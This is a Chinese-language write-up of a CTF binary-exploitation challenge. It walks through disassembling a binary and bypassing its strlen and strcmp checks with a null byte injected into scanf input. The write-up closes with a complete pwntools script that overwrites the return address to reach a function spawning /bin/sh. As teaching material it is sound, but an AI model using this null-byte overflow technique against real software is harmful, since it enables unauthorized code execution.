# Writeup：cheer_for_kotone（Null-byte 截斷繞過 + ret2win）

> 目標檔案：[cheer_for_kotone](cheer_for_kotone)
> 遠端：`nc ctf.adl.tw 10001`
> 分類：Binary Exploitation / pwn
> 前提假設：只有 `cheer_for_kotone` 這一個二進位檔案，沒有原始碼、沒有提示，從零分析。
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/找字串）、[cheer_for_kotone_solve.py](cheer_for_kotone_solve.py)（最終 exploit）

這題是 `pwn101` 的進階版：同樣是 `ret2win`，但作者多加了兩道「看起來像防護」的檢查，必須先看懂這兩道檢查在檢查什麼、檢查的時間點在哪，才能找到繞過的方法。

---

## 1. 初步偵查

```bash
file cheer_for_kotone
```
```
cheer_for_kotone: ELF 64-bit LSB executable, x86-64, ... dynamically linked, ... not stripped
```

```bash
checksec --file=cheer_for_kotone
```
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
Stripped:   No
```

重點情報：**沒有 canary**、**沒有 PIE**（位址固定）。跟 `pwn101` 一樣，not stripped，可以直接看函式名字。

## 2. 列出 symbol table，找可疑函式

```python
from pwn import ELF
e = ELF('cheer_for_kotone', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if name:
        print(hex(addr), name)
```

跟 `pwn101` 同樣的模式又出現了一次：

```
0x4010c4 execve / plt.execve     ← 正常程式不會手動 import 這個
0x4010d4 strcmp / plt.strcmp     ← 代表程式裡有「比對字串」的邏輯
0x4010f4 __isoc99_scanf          ← 代表用 scanf 讀輸入（通常是 %s，無長度限制）
0x40125b shukishukidaishuki      ← 又是一個正常流程不會呼叫到的奇怪命名函式
0x40127f main
```

看到 `execve` import + 一個風格突兀的函式名 `shukishukidaishuki`，直接比照上一題的經驗：**這又是一個 win function**。

## 3. 反組譯確認 win function

```asm
0x40125b: endbr64
0x40125f: push rbp
0x401260: mov rbp, rsp
0x401263: mov edx, 0
0x401268: mov esi, 0
0x40126d: lea rax, [rip + 0xd94]   ; -> 算出位址 0x402008
0x401274: mov rdi, rax
0x401277: call execve
0x40127c: nop
0x40127d: pop rbp
0x40127e: ret
```

把 `0x402008` 的字串讀出來：

```python
e.read(0x402008, 16).split(b'\x00')[0]   # -> b'/bin/sh'
```

確認：`shukishukidaishuki()` = `execve("/bin/sh", NULL, NULL)`，跟上一題一樣是現成的 win function，位址固定在 `0x40125b`。

## 4. 反組譯 main()，這次多了防護邏輯

```asm
0x40127f: endbr64
0x401283: push rbp
0x401284: mov rbp, rsp
0x401287: sub rsp, 0x20              ; buffer 只有 0x20 (32) bytes，比上一題的 48 bytes 更小
...
0x4012b3: lea rax, [rbp - 0x20]      ; buf 位址
0x4012b7: mov rsi, rax
0x4012ba: lea rax, [rip + 0xd91]     ; "%s"
0x4012c1: mov rdi, rax
0x4012c9: call __isoc99_scanf        ; scanf("%s", buf)  <- 沒有長度限制！

0x4012ce: lea rax, [rbp - 0x20]
0x4012d2: mov rdi, rax
0x4012d5: call strlen                ; strlen(buf)
0x4012da: cmp rax, 0x20
0x4012de: jbe 0x401317                ; 長度 <= 32 就跳過下面的錯誤訊息
    ; --- 長度 > 32 的分支 ---
0x4012e0~0x401308: puts(...) x3       ; 印出三段字串（其中一段是亂碼，另外兩段是提示）
0x40130d: mov edi, 0
0x401312: call exit                   ; exit(0) <- 直接終止程序！

0x401317: lea rax, [rbp - 0x20]       ; (長度 <= 32 的分支繼續往下)
0x40131b: lea rdx, [rip + 0x13f6]     ; -> 算出位址 0x402718
0x401322: mov rsi, rdx
0x401325: mov rdi, rax
0x401328: call strcmp                 ; strcmp(buf, 密語)
0x40132d: test eax, eax
0x40132f: je 0x401359                 ; 相等(==0) 就跳到結尾
    ; --- 不相等的分支 ---
0x401331~0x40134a: puts(...) x2
0x40134f: mov edi, 0
0x401354: call exit                   ; exit(0) <- 又是直接終止！

0x401359: mov eax, 0                  ; (兩個檢查都過，才會走到這裡)
0x40135e: leave
0x40135f: ret                         ; <- 唯一真正執行到 ret 的路徑
```

把字串位址都讀出來（方法同上，`lea` 指令算出的位址 = 下一條指令位址 + rip 相對位移）：

```python
e.read(0x4026f4, 32).split(b'\x00')[0]   # -> b'\nBuffer Over Flow !!!'
e.read(0x402718, 32).split(b'\x00')[0]   # -> b'shukishukidaishuki'  <- 密語！
e.read(0x40272b, 32).split(b'\x00')[0]   # -> b'Your cheering is not enough!'
```

### 整理成 C 虛擬碼

```c
char buf[0x20];
scanf("%s", buf);                           // 沒有長度限制，overflow 漏洞仍在

if (strlen(buf) > 0x20) {                   // 檢查 1
    puts("Buffer Over Flow !!!");
    exit(0);                                // 直接終止，不會走到 main 的 ret
}
if (strcmp(buf, "shukishukidaishuki") != 0) {  // 檢查 2
    puts("Your cheering is not enough!");
    exit(0);                                // 直接終止，不會走到 main 的 ret
}
return 0;   // 只有這條路徑會真的執行 main 的 leave; ret
```

## 5. 關鍵觀察：漏洞還在，但要繞過兩道檢查

跟 `pwn101` 不同，這題不能單純「填滿 buffer 再蓋 return address」，因為：

- `scanf` 寫入沒有長度限制 → **漏洞本體沒變**，一樣可以 overflow 蓋到 return address。
- 但如果輸入長度 `> 0x20`（32），程式會呼叫 **`exit(0)` 直接終止**，根本不會執行到 `main` 的 `ret` 指令 —— 這代表「單純送一長串字串 + 位址」這招在這題行不通，因為要蓋到 return address（offset `0x28`=40 bytes）本來就一定會超過 32。
- 就算長度過了第一關，字串內容還要 **`strcmp()` 完全等於 `"shukishukidaishuki"`**，否則一樣 `exit(0)`。

兩道檢查表面上看起來把路徑都堵死了。但問題出在**檢查用的函式**和**實際寫入記憶體的函式**，對「字串結尾」的認定不一樣：

| 函式 | 什麼時候停止 |
|---|---|
| `scanf("%s", buf)` | 遇到**空白字元**（space/tab/newline）才停止，`\x00` **不算**空白字元，會被當成普通 byte 繼續寫入 |
| `strlen(buf)` | 遇到第一個 `\x00` 就回報長度 |
| `strcmp(a, b)` | 逐字元比對到任一邊出現 `\x00` 為止 |

**這就是繞過的縫隙**：只要在想要的字串內容後面塞一個 `\x00`，`strlen()`/`strcmp()` 看到的就只有 `\x00` 前面那一小段（判斷通過），但 `scanf` 實際寫進記憶體的 bytes 會**無視這個 `\x00`，繼續往後寫**，一路寫到我們塞的 return address。

## 6. 組 Payload

Offset 計算（跟上一題同樣的方法，從 `sub rsp, 0x20` 讀出來）：

```
buf 大小 = 0x20 (32) bytes
saved rbp = 8 bytes（64-bit 固定）
offset = 0x20 + 0x8 = 0x28（40）bytes
```

Payload 設計：

```
payload = b"shukishukidaishuki"      # 19 bytes，密語本體
payload += b"\x00"                    # 20 bytes，讓 strlen/strcmp 在這裡停止判斷
payload += b"A" * (0x28 - 20)         # 填到 40 bytes，蓋滿 buf + saved rbp 剩餘部分
payload += p64(0x40125b)              # 蓋 return address -> shukishukidaishuki()
```

執行流程驗證：

1. `scanf` 把整串 48 bytes（19+1+20+8）都寫進去，因為中間沒有任何空白字元，`%s` 不會提前停止。
2. `strlen(buf)` 從頭掃到第一個 `\x00`（在第 19 個字元後面），回傳 **19**，`19 <= 32` → **通過檢查 1**，不會 `exit(0)`。
3. `strcmp(buf, "shukishukidaishuki")` 比較的也是這段以 `\x00` 結尾的字串，剛好完全等於密語 → `strcmp` 回傳 **0** → **通過檢查 2**，不會 `exit(0)`。
4. 兩個檢查都通過，程式走到 `0x401359: mov eax,0; leave; ret`，執行真正的 `ret`。
5. 但這時候 return address 早就被我們蓋成了 `0x40125b` —— `ret` 跳過去，執行 `execve("/bin/sh")`，拿到 shell。

## 7. 完整 Exploit Script

```python
from pwn import *

context.arch = 'amd64'

HOST, PORT = 'ctf.adl.tw', 10001

WIN_FUNC = 0x40125b
SECRET   = b'shukishukidaishuki'
BUF_SIZE = 0x20
SAVED_RBP = 0x8
OFFSET = BUF_SIZE + SAVED_RBP   # 0x28

p = remote(HOST, PORT, timeout=10)

payload = SECRET
payload += b'\x00'
payload += b'A' * (OFFSET - len(payload))
payload += p64(WIN_FUNC)

p.recvuntil(b'messages!', timeout=5)
p.sendline(payload)

p.interactive()
```

連線成功拿到 shell 後，手動輸入：

```
find / -iname "*flag*" 2>/dev/null
```

定位到 `/home/cheer_for_kotone/flag`，再：

```
cat /home/cheer_for_kotone/flag
```

拿到：

```
ADLCTF{13in9_b0n9_B4n9_B0n9!!!_S3lF-4ff1rm4t10n_3xpl0510n!!!}
```

---

## 重點整理

- **漏洞本體跟 `pwn101`一樣**：`scanf("%s", buf)` 沒有長度限制，造成 stack buffer overflow；二進位沒有 canary，overflow 不會被偵測。
- **這題多加的「防護」其實只檢查了結果，沒有阻止寫入本身**：`strlen()`/`exit(0)` 跟 `strcmp()`/`exit(0)` 這兩道檢查，都是等 `scanf` **已經把資料寫完**之後才執行，它們能做的頂多是「決定要不要繼續往下跑」，完全無法把已經覆寫出去的記憶體還原。
- **繞過關鍵是「字串結尾」定義不一致**：`scanf("%s")` 以空白字元為界，`strlen`/`strcmp` 以 `\x00` 為界。在想通過驗證的內容後面塞一個 `\x00`，就能讓「驗證邏輯看到的字串」跟「實際寫入記憶體的 bytes」產生落差——驗證邏輯檢查的是前半段，真正的 overflow payload 藏在後半段。這是一種常見的 **null-byte injection / 字串長度認知不一致** 手法。
- **攻擊手法本質仍是 ret2win**：找到現成、正常流程不會呼叫到的函式（`shukishukidaishuki` → `execve("/bin/sh")`），想辦法讓 overflow 精準蓋到 return address 即可，不需要自己寫 shellcode。
- **解題思路順序**：`file`/`checksec` 初步偵查 → 列 symbol table 找可疑函式（`execve` import + 怪名字函式）→ 反組譯確認 win function → 反組譯 `main()`，這次要完整讀懂每一個分支（尤其是每條路徑最後是走到 `exit()` 還是 `ret`）→ 發現「檢查發生在寫入之後」+「不同函式對字串結尾認定不同」這兩個條件同時成立 → 設計 payload 讓驗證邏輯跟實際寫入產生落差 → 連線驗證、找 flag。
